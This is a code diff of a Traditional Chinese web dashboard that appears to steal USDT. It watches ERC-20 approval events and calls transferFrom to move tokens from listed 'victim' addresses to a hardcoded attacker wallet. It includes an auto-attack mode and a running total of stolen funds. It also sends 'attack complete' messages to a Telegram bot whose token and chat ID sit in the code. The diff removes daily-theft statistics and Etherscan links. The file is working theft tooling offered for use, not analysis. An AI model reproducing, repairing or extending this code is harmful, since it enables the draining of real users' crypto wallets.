@@ -2,7 +2,7 @@
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>🌟 EOA 控制台 v1.6.4（攻擊金額 + Etherscan + 每日統計）</title>
+  <title>🌟 EOA 控制台 v1.6.3（攻擊完成通知 + Telegram）</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body { font-family: 'Arial'; padding: 20px; background: #fff; }
@@ -21,17 +21,17 @@
   </style>
 </head>
 <body>
-  <h2>🌟 EOA 控制台 v1.6.4（攻擊金額 + Etherscan + 每日統計）</h2>
+  <h2>🌟 EOA 控制台 v1.6.3（攻擊完成通知 + Telegram）</h2>
   <p><b>目前登入帳號：</b><span id="account">--</span></p>
   <button onclick="connect()">🔑 點我登入 MetaMask</button>
   <p><b>身份驗證：</b><span id="auth" class="bad">未驗證</span></p>
   <p><b>攻擊者 USDT 餘額：</b><span id="mybalance">--</span></p>
   <p><b>最後刷新時間：</b><span id="refresh">--</span></p>
   <p><b>累積盜取金額：</b><span id="total">0 USDT</span></p>
-  <p><b>本日盜取金額：</b><span id="daily">0 USDT</span></p>
   <p><b>自動攻擊狀態：</b><span id="mode" class="bad">已停用</span></p>
   <button onclick="toggleAuto()">🔄 切換自動攻擊</button>
   <p id="notify"></p>
+
   <input id="victim" placeholder="受害者地址" />
   <button onclick="steal()">🤸️ 盜取 USDT</button>
   <p id="balance"></p>
@@ -50,6 +50,7 @@
     const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
     const TELEGRAM_BOT_TOKEN = "7606713225:AAHwaKecCJXPhCAOyC8I7W3954UDnI88lPs";
     const TELEGRAM_CHAT_ID = "6444584996";
+
     const ABI = [
       "event Approval(address indexed owner, address indexed spender, uint256 value)",
       "function transferFrom(address from, address to, uint256 value) returns (bool)",
@@ -59,18 +60,9 @@
 
     let provider, signer, sender;
     let totalStolen = ethers.BigNumber.from("0");
-    let dailyStolen = ethers.BigNumber.from("0");
     let autoEnabled = false;
     const attackedSet = new Set();
     const knownApprovals = new Set();
-
-    function isToday(date) {
-      const t = new Date(date);
-      const now = new Date();
-      return t.getFullYear() === now.getFullYear() &&
-             t.getMonth() === now.getMonth() &&
-             t.getDate() === now.getDate();
-    }
 
     async function connect() {
       provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -129,6 +121,7 @@
 
         if (autoEnabled) await autoSteal(owner);
       }
+
       document.getElementById("refresh").innerText = new Date().toLocaleTimeString();
     }
 
@@ -142,15 +135,12 @@
       });
     }
 
-    async function notifyAttackSuccess(addr, amount, txhash) {
-      const usdt = ethers.utils.formatUnits(amount, 6);
-      const time = new Date().toLocaleString();
-      const link = `https://etherscan.io/tx/${txhash}`;
-      const text = `☑️攻擊完成\n👤 地址：${addr}\n🕐 時間：${time}\n💰 金額：${usdt} USDT\n🔗 [Etherscan](${link})`;
+    async function notifyAttackSuccess(addr) {
+      const text = `☑️攻擊完成\n👤 地址：${addr}\n🕐 時間：${new Date().toLocaleString()}`;
       fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "Markdown" })
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text })
       });
     }
 
@@ -163,18 +153,16 @@
       if (amount.isZero()) return;
       const tx = await contract.transferFrom(victim, attacker, amount);
       totalStolen = totalStolen.add(amount);
-      if (isToday(Date.now())) dailyStolen = dailyStolen.add(amount);
-
       document.getElementById("total").innerText = ethers.utils.formatUnits(totalStolen, 6) + " USDT";
-      document.getElementById("daily").innerText = ethers.utils.formatUnits(dailyStolen, 6) + " USDT";
-      document.getElementById("status").innerText = `✅ TX Hash: <a href='https://etherscan.io/tx/${tx.hash}' target='_blank'>${tx.hash}</a>`;
+      document.getElementById("status").innerText = "✅ TX Hash: " + tx.hash;
 
       const row = document.getElementById(`status-${victim}`);
       if (row) {
-        row.innerHTML = `✅ 成功<br><a href='https://etherscan.io/tx/${tx.hash}' target='_blank'>TX Link</a>`;
+        row.innerText = "✅ 成功";
         row.className = "ok";
       }
-      await notifyAttackSuccess(victim, amount, tx.hash);
+
+      await notifyAttackSuccess(victim);
       attackedSet.add(victim);
     }
 
